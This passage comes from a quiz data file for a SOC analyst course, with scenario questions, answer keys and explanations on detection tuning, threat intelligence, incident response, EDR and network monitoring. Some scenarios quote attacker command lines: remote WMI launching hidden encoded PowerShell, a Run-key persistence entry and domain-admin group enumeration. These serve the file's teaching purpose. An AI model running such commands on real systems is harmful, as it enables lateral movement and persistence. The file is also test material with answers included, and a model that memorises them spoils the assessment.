        question: "What is the BEST evolution of the rule (not just a suppression)?",
        options: [
          "Delete the detection rule completely from the SIEM system because it is too noisy to be useful for operations and causes alert fatigue for the analyst shift.",
          "Lower the alert severity level to informational in the queue and instruct analysts to ignore these logs unless they are correlated with other host compromises.",
          "Move the raw logs to a different archival SIEM platform that is not actively monitored by the SOC team to keep the primary queue clean and focused on alerts.",
          "Refine logic: decode payload and alert on suspicious indicators (e.g. DownloadString, IEX) if parent is not SCCM; maintain approved SCCM hashes on review list."
        ],
        correctAnswer: 3,
        explanation: "Detection engineering > alert handling. The strongest detections combine a behavioral signal (suspicious decoded content), a context filter (parent process), and a maintainable allow-list. Deleting noisy rules surrenders coverage; suppressing them blindly creates blind spots."
      },
      {
        id: "q4-5",
        difficulty: "medium",
        tags: ["Metrics", "SLA"],
        scenario: "Quarterly metrics:\n  MTTD: 14 min  MTTA: 47 min  MTTR: 2 h 30 min\n  Analyst headcount: unchanged.  Alert volume: +60%.",
        question: "Which metric points to the most actionable problem?",
        options: [
          "MTTD — threat detections are slow, meaning the average time from raw log ingestion to alert generation is the primary bottleneck in the system.",
          "MTTR — incident response is slow, meaning contained incidents take too long to fully remediate and recover, suggesting SOAR playbooks are failing.",
          "MTTA — alerts sit unacknowledged for 47m due to capacity/volume mismatch; address this via queue tuning, automation, or staffing adjustments.",
          "Headcount is irrelevant — the metrics indicate that the overall workload is stable and the current staff can handle the alert queue easily."
        ],
        correctAnswer: 2,
        explanation: "MTTD is healthy (detections fire quickly). MTTA being the long pole means alerts are queueing — the lever is reducing volume (tuning), increasing throughput (SOAR/automation), or adding analysts. Knowing which metric to act on is more valuable than memorizing definitions."
      },
      {
        id: "q4-6",
        difficulty: "hard",
        tags: ["Use Case Lifecycle"],
        scenario: "Your SOC manager asks you to propose a NEW detection use case for 'OAuth consent phishing in M365.'",
        question: "Which response best follows the use-case lifecycle?",
        options: [
          "Write a simple detection rule that triggers an alert on every single new OAuth consent grant in the Microsoft 365 environment, then triage them manually in queue.",
          "Contact the M365 security vendor directly and open a feature request asking their support engineers to build and deploy a pre-configured detection rule in production.",
          "Block all OAuth applications globally in Microsoft 365 configuration to completely eliminate the risk of consent phishing without needing any detection rules.",
          "Follow lifecycle: (1) hypothesis, (2) check data source, (3) define logic (unverified publisher + risky scopes), (4) validate in dev, (5) tune, (6) write runbook."
        ],
        correctAnswer: 3,
        explanation: "Mature detection programs follow a lifecycle: hypothesis -> data availability -> logic -> validation -> tuning -> documentation. Skipping any step is how you get rules nobody trusts or knows how to triage."
      }
    ]
  },
  {
    quizId: "q5",
    courseId: "soc-fundamentals",
    title: "Threat Intelligence in Action",
    description: "Scenario quiz on applying CTI to detection, triage, and decisions.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q5-1",
        difficulty: "medium",
        tags: ["IOC Lifecycle"],
        scenario: "A vendor IOC feed pushes 80,000 IPs/day. You ingest them all as blocklists. Within a week, you see business outages from blocked legitimate services.",
        question: "What was the core mistake?",
        options: [
          "Ingesting indicators from a vendor feed at all without verifying their source credentials.",
          "Not buying more vendor feeds to confirm the IP reputations before blocking them.",
          "Blocking IPs is always wrong and we should focus entirely on domain names instead.",
          "Treating raw indicators as enforcement data without scoring, source reputation, and expiry lifecycle procedures."
        ],
        correctAnswer: 3,
        explanation: "Mature CTI applies confidence scoring (TLP, source rep), an action tier (alert vs. block), and an expiry policy. Raw firehose feeds belong in detection/enrichment first, enforcement only after scoring."
      },
      {
        id: "q5-2",
        difficulty: "hard",
        tags: ["Diamond Model"],
        scenario: "Investigation finds: adversary 'FIN8', capability 'Sardonic backdoor', infrastructure '198.51.100.50', victim 'retail point-of-sale'.",
        question: "These four facets map to which model, and what is its analytical value?",
        options: [
          "Diamond Model — Adversary, Capability, Infrastructure, Victim; pivoting along any edge expands the investigation.",
          "Cyber Kill Chain — mapped to seven linear phases of an intrusion lifecycle to evaluate chronological progress.",
          "STRIDE — threat modeling framework used to categorize potential software security flaws and system weaknesses.",
          "OWASP Top 10 — standardized list of the most critical security risks for web applications in the industry."
        ],
        correctAnswer: 0,
        explanation: "Diamond Model is built for relational pivoting across the four facets. Each edge enables a hypothesis ('what other victims share this infrastructure?' 'what other capabilities does this adversary use?'). It pairs naturally with ATT&CK and the Kill Chain."
      },
      {
        id: "q5-3",
        difficulty: "medium",
        tags: ["TLP"],
        scenario: "A peer SOC shares a hot indicator marked TLP:AMBER+STRICT. A vendor sales rep asks you to share it for a webinar.",
        question: "What may you do?",
        options: [
          "Share the indicator — vendors are trusted partners and can help disseminate the information safely.",
          "Refuse; TLP:AMBER+STRICT restricts sharing to the recipient organization only; external redistribution is forbidden.",
          "Post it publicly to warn the general community and help other organizations block the threat immediately.",
          "Forward the indicator details to the sales rep but remove the source organization's name to hide the origin."
        ],
        correctAnswer: 1,
        explanation: "TLP:AMBER = limited distribution within the recipient org and clients with need-to-know. The +STRICT modifier removes the 'clients' clause. Violating TLP destroys trust and intel-sharing relationships."
      },
      {
        id: "q5-4",
        difficulty: "hard",
        tags: ["Pivoting", "OSINT"],
        scenario: "You have one C2 domain: secure-update-cdn[.]net (registered 4 days ago, NameCheap, Cloudflare-fronted).",
        question: "Which pivot sequence yields the MOST analytical value?",
        options: [
          "Just block the domain at your web gateway and close the investigation immediately to focus on other queue alerts.",
          "Pivot WHOIS/pDNS/Certs: search registrant email, historical IPs, certificate SANs, and sandbox hosted payload templates.",
          "Run an active aggressive port scan (Nmap) against the domain's Cloudflare-fronted resolution IP address.",
          "Perform a basic Google search on the domain name and read general community forum posts for mentions of it."
        ],
        correctAnswer: 1,
        explanation: "Single-indicator -> infrastructure cluster is the heart of CTI pivoting. WHOIS + passive DNS + cert transparency consistently reveal sibling infrastructure that the adversary is already using or about to use — letting you detect ahead, not behind."
      },
      {
        id: "q5-5",
        difficulty: "medium",
        tags: ["Strategic vs Tactical"],
        scenario: "Your CISO asks: 'Should we be worried about the new Volt Typhoon reporting?' She wants 1 page.",
        question: "Which CTI deliverable level is this?",
        options: [
          "Tactical — file hashes and IP indicators to import directly into a firewall blocklist or SIEM detection rules.",
          "Strategic — business risk, sector targeting, board-level implications and recommended posture changes.",
          "Operational — campaign-level TTPs and hunting hypotheses for the incident response and threat hunting teams.",
          "Technical — malware binary reverse engineering and disassembly analysis for the malware research team."
        ],
        correctAnswer: 1,
        explanation: "CTI tiers: Strategic (executive, business risk), Operational (campaigns/TTPs for IR/hunt), Tactical (IOCs for detection/blocking), Technical (deep reverse engineering). Knowing the audience determines the output."
      },
      {
        id: "q5-6",
        difficulty: "hard",
        tags: ["IOC Confidence"],
        scenario: "Same IP 203.0.113.99 appears in:\n  - Internal: failed C2 sinkhole hit (1 hit, last week)\n  - Open-source feed: '1,200 confidence votes, malware C2'\n  - Commercial: 'shared hosting, mixed reputation'\n  - VirusTotal: 3/89 detections, all generic",
        question: "What is the correct decision?",
        options: [
          "Block immediately at perimeter — the open-source feed has 1,200 votes and the majority of sources flag the IP.",
          "Alert and enrich: shared hosting + low VT + single internal hit = high false-positive risk; collect more context first.",
          "Ignore the IP completely — the VirusTotal score of only 3/89 detection engines confirms the indicator is benign.",
          "Add the IP to threat intelligence report and close the investigation without taking any additional defensive action."
        ],
        correctAnswer: 1,
        explanation: "Shared/CDN infrastructure + thin internal evidence + weak AV consensus = classic 'alert and enrich,' not 'block.' Confidence scoring across sources prevents self-inflicted outages — a recurring real-world CTI failure mode."
      }
    ]
  },
  {
    quizId: "q6",
    courseId: "soc-fundamentals",
    title: "Incident Response Decisions",
    description: "NIST IR lifecycle applied to live incidents — containment, eradication, recovery, lessons learned.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q6-1",
        difficulty: "medium",
        tags: ["Containment"],
        scenario: "EDR confirms ransomware actively encrypting files on a single workstation, WS-203. Network share \\\\fileserver\\finance is mounted from that host.",
        question: "What is the CORRECT first containment step?",
        options: [
          "Power off WS-203 immediately by pulling its power cable to stop the encryption as fast as possible.",
          "Reimage WS-203 immediately using the latest golden image to ensure all malicious files are removed.",
          "Network-isolate WS-203 via EDR (preserves memory for forensics) AND revoke the user's share permissions on \\\\fileserver\\finance.",
          "Wait until you fully understand the ransomware variant before taking any containment action on the host."
        ],
        correctAnswer: 2,
        explanation: "Network isolation (EDR containment) stops lateral encryption and C2 while preserving volatile evidence — pulling power destroys memory artifacts (keys, injected code). Cutting the user's share rights protects the secondary blast radius."
      },
      {
        id: "q6-2",
        difficulty: "hard",
        tags: ["Evidence", "Chain of Custody"],
        scenario: "You suspect this incident may lead to litigation. You took a triage memory dump and ran several commands on the live host.",
        question: "What MUST you document for evidence to remain admissible?",
        options: [
          "Chain of custody: who collected/handled what, when, tool/version, SHA-256 hashes at collection, storage location, and every transfer signed/dated.",
          "Nothing — the EDR platform automatically logs all actions and the vendor will provide court-ready reports.",
          "Just save all the acquired artifact files in a shared drive folder so that the legal team can retrieve them.",
          "Email the acquired files directly to the legal department so the attorneys have immediate access to the data."
        ],
        correctAnswer: 0,
        explanation: "Admissibility hinges on demonstrable integrity (hashes at collection and at use) and an unbroken chain (every handler, every transfer). Without it, defense counsel will exclude the evidence — and your investigation collapses."
      },
      {
        id: "q6-3",
        difficulty: "medium",
        tags: ["NIST Lifecycle"],
        scenario: "After containment of a webshell on a public web server, you have removed the file, rotated credentials, and restored from backup. Tickets are closed.",
        question: "What essential NIST phase is being skipped?",
        options: [
          "Detection — the team has not properly validated whether the SIEM rule that triggered the initial alert is accurate.",
          "Containment — the compromised web server should still be network-isolated before any restore is performed.",
          "Preparation — the incident response plan should be reviewed and updated before any future incidents occur.",
          "Post-Incident Lessons Learned — RCA of how the webshell arrived, control gaps identified, and runbook updates."
        ],
        correctAnswer: 3,
        explanation: "Skipping post-incident review is the most common immaturity in young IR programs. The webshell got there via an unpatched CVE or a misconfig; closing without RCA guarantees recurrence."
      },
      {
        id: "q6-4",
        difficulty: "hard",
        tags: ["Eradication"],
        scenario: "You eradicated malware on 3 hosts. A week later, the same malware re-appears on host #4 in the same subnet.",
        question: "What is the MOST likely root cause and the right fix?",
        options: [
          "Pure bad luck — simply repeat the exact same eradication procedure on host #4 and close the incident.",
          "Antivirus signatures were outdated during the initial sweep and failed to detect all copies of the malware.",
          "Incomplete eradication — missed persistence (task/WMI/credential). Hunt full environment for initial-access vector and all persistence mechanisms before re-eradicating.",
          "The EDR vendor must be contacted to provide a specialized removal tool before any further action is taken."
        ],
        correctAnswer: 2,
        explanation: "Reinfection nearly always means root cause (initial access) or persistence was missed. Mature IR scopes the full footprint (all hosts, all persistence locations, all credentials touched) before declaring eradication."
      },
      {
        id: "q6-5",
        difficulty: "medium",
        tags: ["Communication"],
        scenario: "30 minutes into a major incident, the CEO walks into the SOC and asks 'is our customer data safe?'",
        question: "Best response?",
        options: [
          "'Yes, everything is fine' — reassure the CEO so they can communicate calmly with the board and avoid panic.",
          "'We have contained the affected host. Current evidence does not show customer-database access; I will update you in 30 minutes.' — factual, scoped, time-bounded.",
          "'We do not know yet — we are not ignoring you' — acknowledge the question but defer all details to the legal team.",
          "Refuse to respond until the full investigation is complete and a formal written report has been reviewed."
        ],
        correctAnswer: 1,
        explanation: "Executive communications during incidents must be factual, scoped to what is known, and include a next-update commitment. Never speculate (false reassurance is reputational suicide); never stonewall (drives parallel un-coordinated action)."
      },
      {
        id: "q6-6",
        difficulty: "hard",
        tags: ["Recovery"],
        scenario: "You restored 12 production servers from backup. The business asks 'can we put them back online now?'",
        question: "Correct gating criteria before re-connection?",
        options: [
          "Yes — backups are inherently clean and restoring from them is sufficient to safely return the servers to production.",
          "Yes — but only reconnect during a low-traffic maintenance window at night to minimize business impact on users.",
          "Wait exactly 30 days regardless of findings, as industry standards require a mandatory observation period after compromise.",
          "Only after: backup verified pre-incident clean, initial-access vector closed, credentials rotated, heightened monitoring deployed, and recovery validated in isolated segment."
        ],
        correctAnswer: 3,
        explanation: "Recovery without closing the root cause and adding heightened monitoring is how organizations get re-owned within days. The five-gate checklist is the IR-team minimum and the basis of every post-incident hardening report."
      }
    ]
  },
  {
    quizId: "q7",
    courseId: "soc-fundamentals",
    title: "EDR & Endpoint Investigation",
    description: "Process trees, behavioral detections, and endpoint forensics scenarios.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q7-1",
        difficulty: "medium",
        tags: ["Process Tree"],
        scenario: "EDR process tree:\n  services.exe -> svchost.exe -> rundll32.exe C:\\Users\\Public\\a.dll,Start -> cmd.exe -> whoami /all\n                                                                              -> net group \"Domain Admins\" /domain",
        question: "What is the most accurate interpretation?",
        options: [
          "Suspicious DLL side-loaded via rundll32 from a user-writable path, performing host and domain recon (T1087). Investigate the DLL origin and isolate.",
          "Routine Windows system activity — svchost spawning rundll32 is normal during service updates and patch installations.",
          "Antivirus scanning — security software uses rundll32 to load DLL-based scanning engines during scheduled scans.",
          "Patch installation — Windows Update uses cmd.exe to run whoami checks and enumerate AD groups during servicing."
        ],
        correctAnswer: 0,
        explanation: "rundll32 executing a DLL from C:\\Users\\Public, followed immediately by whoami + Domain Admin enumeration, is the post-exploitation signature of a hands-on-keyboard adversary or a discovery payload."
      },
      {
        id: "q7-2",
        difficulty: "hard",
        tags: ["Living Off the Land"],
        scenario: "You see `wmic process call create \"powershell -nop -w hidden -e <base64>\"` executed remotely by a domain account against 18 servers in 4 minutes.",
        question: "What is this and what is the priority action?",
        options: [
          "Authorized patching tool — IT operations uses wmic to push encoded PowerShell update scripts to many servers simultaneously.",
          "Performance monitoring — the encoded PowerShell retrieves WMI performance counters from remote servers for the monitoring dashboard.",
          "Backup job — a scheduled backup agent uses hidden PowerShell to copy data from each server to the central backup repository.",
          "Lateral movement via WMI (T1047) with encoded payload — disable the account, isolate target hosts, capture memory, and decode the payload offline."
        ],
        correctAnswer: 3,
        explanation: "WMI remote process creation with hidden encoded PowerShell across many hosts in minutes is a hallmark lateral-movement pattern (Cobalt Strike `wmi`, Impacket `wmiexec`, manual `wmic`). Account containment first to halt the spread."
      },
      {
        id: "q7-3",
        difficulty: "medium",
        tags: ["EDR vs AV"],
        scenario: "Comparing two products on the same incident: legacy AV flagged nothing; EDR flagged 7 behaviors and built a process tree.",
        question: "Which statement best explains the difference?",
        options: [
          "AV is more secure than EDR because it uses stricter signature policies that have been hardened by decades of industry deployment.",
          "They are functionally the same product — the only practical difference is EDR has a more modern graphical interface and better vendor support.",
          "EDR has better signature databases that are updated more frequently, which is why it catches more malware than legacy antivirus.",
          "AV is signature/hash-based and misses fileless attacks; EDR records process, file, registry, and network telemetry enabling behavioral detection and retrospective hunting."
        ],
        correctAnswer: 3,
        explanation: "EDR's advantage is telemetry + behavioral analytics + response, not just 'better signatures.' This is also why EDR enables threat hunting and forensics whereas AV cannot."
      },
      {
        id: "q7-4",
        difficulty: "hard",
        tags: ["Forensics", "Volatile Data"],
        scenario: "Suspected fileless malware on a live host. You have 30 minutes before the user returns.",
        question: "What is the CORRECT collection order?",
        options: [
          "Take a full disk image first, then run a memory dump tool to capture RAM before touching any running processes.",
          "Reboot the host first to clear any suspicious in-memory processes and then capture the resulting clean system state.",
          "Order of Volatility: (1) RAM dump, (2) network connections and running processes, (3) disk artifacts, (4) logs. Memory FIRST since fileless malware lives only in RAM.",
          "Run a full AV scan first to identify any malicious files, then capture memory and disk as secondary collection steps."
        ],
        correctAnswer: 2,
        explanation: "Order of Volatility (RFC 3227): most-volatile first. Fileless malware (reflective DLLs, in-memory PowerShell) leaves nothing on disk — losing RAM loses the case."
      },
      {
        id: "q7-5",
        difficulty: "medium",
        tags: ["Persistence"],
        scenario: "Autoruns / Sysmon EID 13 on workstation shows:\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> \"Updater\" = \"powershell -w hidden -enc ...\"",
        question: "What is this and what is the right action?",
        options: [
          "Legitimate Windows update mechanism — Microsoft uses HKCU Run keys to launch PowerShell-based update scripts at user logon.",
          "User-level Registry Run-key persistence (T1547.001) executing hidden encoded PowerShell. Capture, decode offline, remove key, kill running instance, hunt fleet.",
          "Group Policy preference — the IT department has configured a logon script via GPO that runs a management PowerShell automation at startup.",
          "Normal Windows operating system feature — PowerShell launched at logon from HKCU Run is a standard component installation method."
        ],
        correctAnswer: 1,
        explanation: "HKCU Run-key is the most common Windows persistence — survives reboot, runs as the user, and is trivially deployable. Always decode the payload OFFLINE (sandbox/safe env), not by executing it on the host."
      },
      {
        id: "q7-6",
        difficulty: "hard",
        tags: ["Response Actions"],
        scenario: "EDR offers: kill process, quarantine file, isolate host, block hash globally, retrieve file, run script.",
        question: "An active beacon is detected on a JUMP server used by all admins. What sequence is BEST?",
        options: [
          "Block the hash globally first across the fleet, then begin the investigation on the isolated jump server.",
          "Reboot the jump server immediately to terminate all active connections and clear any in-memory payloads.",
          "Kill the beacon process first to stop all active C2 communication before collecting any forensic evidence.",
          "Isolate host, retrieve beacon binary, capture memory, kill process, quarantine file, block hash globally, then hunt fleet-wide."
        ],
        correctAnswer: 3,
        explanation: "Isolate before kill — killing the process destroys the live state you need to analyze. Retrieve + capture memory while the host is contained but powered, then proceed to kill/quarantine and finally fleet-wide hunting. Jump-server compromise means EVERY admin credential touched recently should also be considered burned."
      }
    ]
  },
  {
    quizId: "q8",
    courseId: "soc-fundamentals",
    title: "Network Security Monitoring",
    description: "NSM scenarios — IDS/IPS, traffic analysis, encrypted-traffic visibility, and pivoting from network signals.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "q8-1",
        difficulty: "medium",
        tags: ["IDS vs IPS"],
        scenario: "Your team must protect a critical OT (operational technology) plant network where false-positive blocks could halt production.",
        question: "What deployment is MOST appropriate?",
        options: [
          "Deploy IDS passive monitoring inside OT + selective IPS enforcement only on high-confidence signatures at the IT/OT boundary.",
          "Deploy IPS in inline blocking mode across the entire OT plant network to enforce strict network policy.",
          "Remove all network monitoring from OT systems to prevent any risk of false positives disrupting production.",
          "Use only endpoint antivirus on OT hosts and avoid network-level monitoring in the plant environment."
        ],
        correctAnswer: 0,
        explanation: "OT environments cannot tolerate false-positive blocks. The mature pattern is rich visibility (IDS/passive) inside the plant, with selective enforcement at the boundary. Knowing when NOT to block is part of the job."
      },
      {
        id: "q8-2",
        difficulty: "hard",
        tags: ["Encrypted Traffic"],
        scenario: "80% of your outbound traffic is TLS-encrypted. You cannot do TLS interception for privacy/regulatory reasons.",
        question: "Which signals STILL give you meaningful detection on encrypted C2?",
        options: [
          "No detection is possible without decryption — you must obtain regulatory approval to intercept and inspect all TLS traffic.",
          "Only NetFlow byte counts — total session sizes per destination can be used to detect large data transfers to suspicious endpoints.",
          "Only DNS queries — block all external DNS resolution at the firewall and only allow DNS to an internal recursive resolver.",
          "JA3/JA3S TLS fingerprints, SNI, certificate fields, DNS pre-queries, destination reputation, beaconing periodicity, byte-volume asymmetry, and ASN/geo."
        ],
        correctAnswer: 3,
        explanation: "Encrypted-traffic analytics is a deep field. TLS metadata (JA3 fingerprints, certs, SNI) + flow behavior (periodicity, asymmetry) + DNS + reputation can detect a remarkable amount without decryption — this is also how modern NDR products operate."
      },
      {
        id: "q8-3",
        difficulty: "medium",
        tags: ["Zeek/Suricata"],
        scenario: "Suricata fires ET POLICY 'self-signed certificate from internal host to external IP on 443.'",
        question: "Best interpretation?",
        options: [
          "Always benign — many legitimate websites and internal applications regularly use self-signed certificates for external TLS connections.",
          "Critical — block the destination IP immediately at the perimeter firewall without further investigation needed.",
          "Suspicious but not conclusive; pivot to host process attribution, destination reputation, JA3 match against C2 frameworks, DNS history, and beacon analysis.",
          "Definitive false positive — disable the Suricata rule since it generates too many alerts on normal internal HTTPS traffic."
        ],
        correctAnswer: 2,
        explanation: "Self-signed certs to external destinations are unusual and worth investigating but not conclusive. The pivots (host process, JA3 match, beacon timing) turn a weak signal into a strong verdict — a classic NSM workflow."
      },
      {
        id: "q8-4",
        difficulty: "hard",
        tags: ["DNS Analysis"],
        scenario: "Zeek dns.log: a host issues 4,200 TXT-record queries in 10 min to subdomains of *.api-telemetry[.]xyz with average label length 35 characters.",
        question: "What is the BEST hypothesis?",
        options: [
          "Legitimate DNS-based service discovery — microservice architectures use high-volume TXT queries to retrieve configuration metadata from DNS.",
          "DNSSEC validation — the host is verifying cryptographic signatures on DNS records for a large number of zone entries.",
          "DNS tunneling / exfiltration (T1071.004) — long random labels + high TXT volume to a single second-level domain; isolate the host and capture pcap.",
          "DNS cache warmup — the resolver is pre-fetching a large number of records to reduce latency for anticipated future lookups."
        ],
        correctAnswer: 2,
        explanation: "Long, high-entropy labels + dominance of TXT records + tight time window + single 2LD = DNS tunneling. Common tools: iodine, dnscat2, Cobalt Strike DNS mode. Detection patterns: entropy, label length, query volume per 2LD."
      },
      {
        id: "q8-5",
        difficulty: "medium",
        tags: ["NetFlow", "Behavioral"],
        scenario: "NetFlow shows host A maintaining a single long-lived TCP connection (24h, ~50 packets/min, small) to a high-numbered port on a foreign IP. No legitimate business reason found.",
        question: "What detection name fits BEST?",
        options: [
          "Outbound DDoS attack — the host is participating in a distributed attack against the foreign IP using repeated small requests.",
          "Remote backup traffic — an automated backup application is uploading incremental data chunks to an off-site storage provider.",
          "Long-lived covert channel / interactive C2 — pivot to process attribution, destination reputation, and similar patterns; capture pcap if still active.",
          "Video streaming — the user is streaming high-definition content from an international media platform with an unusual port configuration."
        ],
        correctAnswer: 2,
        explanation: "Persistent low-volume sessions are the signature of interactive shells (reverse SSH, custom C2). NetFlow alone is enough to spot them; pcap + EDR confirm."
      },
      {
        id: "q8-6",
        difficulty: "hard",
        tags: ["Lateral Movement"],
        scenario: "Internal east-west traffic spike: workstation 10.0.5.99 initiated 445/tcp (SMB) and 5985/tcp (WinRM) to 38 servers in 11 minutes, then 88/tcp (Kerberos) traffic patterns consistent with Kerberoasting requests.",
        question: "What is happening?",
        options: [
          "Authorized inventory scan — the IT team is running an approved network discovery tool to document server configurations.",
          "Backup software — a backup agent is authenticating via WinRM to retrieve data from each server before archiving it.",
          "Group Policy refresh — the workstation is applying updated group policies that require contacting all domain member servers.",
          "Active lateral movement + Kerberoasting: SMB/WinRM sweep (T1021.002/.006) plus service-ticket harvesting (T1558.003). Disable account, isolate host, alert IR."
        ],
        correctAnswer: 3,
        explanation: "Burst SMB+WinRM fan-out plus Kerberos service-ticket requests for many SPNs is unmistakable Kerberoasting + LM. Speed matters — every minute is more compromised credentials."
      }
    ]
  },
  {
    quizId: "q9",
    courseId: "soc-fundamentals",
    title: "SOC Mastery: Hunting, Handover & Career",
    description: "Synthesis quiz covering proactive hunting, shift handover discipline, investigation rigor, and analyst growth.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "q9-1",
        difficulty: "medium",
        tags: ["Hunting", "Hypothesis"],
        scenario: "Your hunt-team lead says 'go hunt for ransomware.'",
        question: "Which is the BEST hypothesis-driven hunt formulation?",
        options: [
          "Perform a broad keyword search for the word 'ransomware' across every available log source in the SIEM.",
          "Run a comprehensive vulnerability scan across all endpoints to find unpatched CVEs associated with ransomware families.",
          "Hypothesis: ransomware operator performed LDAP/SAMR AD recon; check AD audit + Sysmon for enumeration spike vs. baseline; hand to detection eng if signal is real.",
          "Block all outbound SMB traffic at the perimeter firewall to prevent ransomware from spreading to network file shares."
        ],
        correctAnswer: 2,
        explanation: "Threat hunting = a falsifiable hypothesis + a specific data source + a defined logic + an outcome (new detection, runbook, or 'no evidence'). 'Search for ransomware' is not a hunt."
      },
      {
        id: "q9-2",
        difficulty: "hard",
        tags: ["Hunting Maturity"],
        scenario: "Your SOC currently only reacts to alerts. Leadership wants to add hunting.",
        question: "Which maturity progression is correct?",
        options: [
          "Purchase a dedicated threat hunting platform immediately and hire ten experienced hunters before starting.",
          "Outsource the hunting program entirely to an MSSP so analysts can focus on alert triage and incident response.",
          "Disable all existing SIEM alert rules to reduce noise so that hunters can focus on proactive investigation.",
          "Map telemetry gaps vs. ATT&CK, start with intel-driven hunts, add hypothesis-driven hunts, mature to ML-assisted, and feed every successful hunt back into detections."
        ],
        correctAnswer: 3,
        explanation: "Hunting maturity grows with telemetry, process, and feedback. Without ATT&CK coverage mapping you don't know what you can hunt; without the 'hunt -> detection' feedback loop you discover the same things forever."
      },
      {
        id: "q9-3",
        difficulty: "medium",
        tags: ["Handover"],
        scenario: "End of your night shift. Active items:\n  - IR-441 ransomware contained, awaiting forensic image\n  - INC-887 user reported phishing; analyzed, malicious, awaiting recall\n  - 12 informational alerts deferred",
        question: "What is the proper handover content?",
        options: [
          "'All good, see you tomorrow' — a brief verbal reassurance lets the incoming shift start fresh without prior assumptions.",
          "For each item: ticket ID, current state, next action with owner, blockers, decisions made with rationale, and ETA; plus environment-wide notes about tonight's threat landscape.",
          "Simply forward all open ticket URLs by email so the incoming analyst can read them directly in the ticketing system.",
          "Give a verbal-only briefing with no written notes so the incoming analyst forms independent unbiased conclusions."
        ],
        correctAnswer: 1,
        explanation: "Structured handover (state + next action + owner + decisions) prevents the most common SOC failure mode: dropped incidents at shift change. Environmental context primes the incoming shift for what to expect."
      },
      {
        id: "q9-4",
        difficulty: "hard",
        tags: ["Investigation Rigor"],
        scenario: "An analyst closes a ticket as 'False Positive — looks like normal admin activity.' No evidence captured, no pivots done.",
        question: "What is wrong with this closure?",
        options: [
          "Nothing is wrong — analyst intuition and experience are sufficient grounds for a false positive determination in a SOC.",
          "The analyst should have escalated the alert to Tier 2 immediately regardless of their personal assessment of the activity.",
          "The analyst should have called the user to verbally confirm whether the activity was authorized before closing the ticket.",
          "No evidentiary basis documented. Proper closure requires evidence trail, pivots performed, and an explicit benign verdict others can verify."
        ],
        correctAnswer: 3,
        explanation: "'Looks normal' is not a verdict. Documented closures are auditable, allow other analysts to learn, and protect the SOC if the case re-emerges. Quality bar: a stranger should be able to reproduce your verdict from the ticket alone."
      },
      {
        id: "q9-5",
        difficulty: "medium",
        tags: ["Bias", "Cognitive"],
        scenario: "An analyst sees a familiar-looking PowerShell command line, recognizes it as 'last week's IT script,' closes the alert. It turns out to be a similar-but-malicious variant.",
        question: "Which cognitive bias drove the error?",
        options: [
          "Anchoring bias — the analyst fixed on the first piece of information (the script name) and did not adjust when new data was available.",
          "Sunk-cost fallacy — the analyst continued with the false positive determination because of time already invested in reviewing the alert.",
          "Recognition / availability bias — prior familiarity over-rode actual verification of hash, signature, parent process, and full command line.",
          "Confirmation bias — the analyst actively sought only evidence that confirmed the activity was the known IT script."
        ],
        correctAnswer: 2,
        explanation: "Recognition bias is the SOC's silent killer. Defense: forced verification checklists ('compare hash, full command line, parent process, signature') prevent pattern-matching from substituting for evidence."
      },
      {
        id: "q9-6",
        difficulty: "medium",
        tags: ["Career", "Growth"],
        scenario: "A Tier 1 analyst wants to grow into detection engineering within 12 months.",
        question: "Which growth plan is MOST realistic and impactful?",
        options: [
          "Apply for a detection engineering manager role immediately to gain leadership experience and exposure to the field.",
          "Wait passively for the company to provide structured training and certification sponsorship for detection engineering.",
          "Watch online videos on detection topics casually during downtime without building hands-on skills or a portfolio.",
          "Build a home lab (Splunk/ELK + Sysmon + Atomic Red Team), contribute to Sigma, write 1 detection/month with metrics, study ATT&CK data sources, shadow senior on tuning."
        ],
        correctAnswer: 3,
        explanation: "Detection engineering is a craft — lab reps + open-source contributions + measurable internal output + ATT&CK fluency + mentorship is the proven path. Passive learning rarely makes the jump."
      },
      {
        id: "q9-7",
        difficulty: "easy",
        tags: ["Wellbeing"],
        scenario: "You have worked a 12-hour shift with a major incident. Your replacement is 20 minutes late and you are exhausted.",
        question: "Best decision?",
        options: [
          "Push through and handle all alerts alone until the replacement physically arrives at the SOC desk.",
          "Inform the duty manager, document the gap, hand over to on-call per policy, and log off — tired analysts make costly mistakes.",
          "Falsify the handover notes to show clean status so the incoming analyst starts without worrying about unresolved items.",
          "Stay silent at your desk and wait until the replacement arrives without escalating the late handover to management."
        ],
        correctAnswer: 1,
        explanation: "Fatigue is a security control failure. Healthy SOCs have explicit escalation paths for late handovers. Burnout-driven errors are the most expensive bugs in the SOC."
      }
    ]
  },
  // Log Analysis Course Quizzes — scenario-based upgrade
  {
    quizId: "la-q1",
    courseId: "log-analysis",
    title: "Log Fundamentals: Formats, Sources & Triage Mindset",
    description: "Scenario-based assessment on log formats, timestamps, normalization, and the analyst mindset for raw log triage.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
        {
          id: "la-q1-1",
          difficulty: "easy",
          tags: ["Log Formats", "Parsing"],
          scenario: "Three log shippers feed your SIEM. Sample lines below — same login event, three formats:\n  A) 2026-06-15T08:14:22Z user=jdoe src=10.1.4.55 action=login status=success\n  B) {\"ts\":\"2026-06-15T08:14:22Z\",\"user\":\"jdoe\",\"src\":\"10.1.4.55\",\"action\":\"login\",\"status\":\"success\"}\n  C) Jun 15 08:14:22 host01 sshd[2231]: Accepted password for jdoe from 10.1.4.55 port 51422 ssh2",
          question: "You need to parse all three reliably into the same schema. Which is true?",
          options: [
            "Format A is JSON, Format B is KV, and Format C is CEF, making all three equally easy to ingest and parse natively in modern SIEM systems.",
            "Format C is the most stable and human-readable representation, which guarantees it will never break when the vendor updates their software version.",
            "Format B (JSON) is the most parser-friendly; Format A (KV) requires a key-value parser, and Format C (syslog) requires custom regex/grok patterns.",
            "All three formats should be stored directly as raw, unparsed string blobs to save indexer CPU and minimize disk storage costs in the SIEM."
          ],
          correctAnswer: 2,
          explanation: "JSON (Format B) is natively structured and self-describing, making it the easiest for modern parsers. KV (Format A) is clean but flat. Syslog (Format C) is semi-structured free text, requiring complex regular expressions or grok patterns that frequently break when vendor formats shift. Raw storage (D) degrades search performance."
        },
        {
          id: "la-q1-2",
          difficulty: "easy",
          tags: ["Timestamps", "Correlation"],
